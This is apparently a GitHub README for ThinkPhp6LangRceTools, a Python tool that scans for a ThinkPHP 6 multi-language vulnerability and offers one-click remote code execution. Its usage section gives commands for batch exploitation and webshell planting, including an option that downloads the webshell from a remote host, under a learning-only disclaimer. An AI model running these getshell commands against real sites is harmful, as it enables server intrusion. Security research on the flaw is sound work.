

<h1 align="center">ThinkPhp6LangRceTools</h1>

<br>

<div align="center">
<img src="https://img.shields.io/github/stars/7coinSec/identity-card-crack-tools?style=for-the-badge&logo=appveyor">
</div>




<h3 align="center">一个用于自检Thinkphp多语言漏洞的工具</h3>

<hr>
	<br>
<div align="center">
		<img width="200" src="images/logo.jpg">
</div>
<h2 align="center">该工具由7coin安全团队强力驱动</h2>
<hr>
	<br>
	<br>



## ThinkPhp6LangRce

一个用于自检Thinkphp多语言漏洞并且可以一键rce的工具，日后再做相关完善。

**注意**

- 本项目仅用于学习交流，请勿用于非法用途
- 如用于非法用法，产生的后果与本项目无关



## Usage:

```py
Usage: "usage:python tp6.py -u/--url -f/--file ","version = 1.0.1"

Options:
  -h, --help            show this help message and exit
  -u URL, --url=URL     Enter the url to be detected
  -f FILEPATH, --file=FILEPATH
                        Enter a list of urls to detect
  -c CHOOSE, --choose=CHOOSE
                        Choose poc detection or exp detection
  -r REMOTEURL, --remoteurl=REMOTEURL
                        enter a remote link
  -v V                  software version

```



## Example:

漏洞自检测:

单个poc检测：`python3 tp6.py -u "http://example.com" -c poc`

批量poc检测：`python3 tp6.py -f url.txt -c poc`

Getshell: 注:选择 -r/--remote参数，可以从远程下载木马，这在默认getshell失败时可以尝试

单个getshell：`python3 tp6.py -u "http://example.com" -c exp`

批量getshell：`python3 tp6.py -f url.txt -c exp `

![image-20221212082839826](https://fge7supload-1307552994.cos.ap-shanghai.myqcloud.com/markdown/image-20221212082839826.png)



## 关注我们

<img src="https://fge7supload-1307552994.cos.ap-shanghai.myqcloud.com/markdown/qrcode_for_gh_f2e957af2c09_344.jpg"/>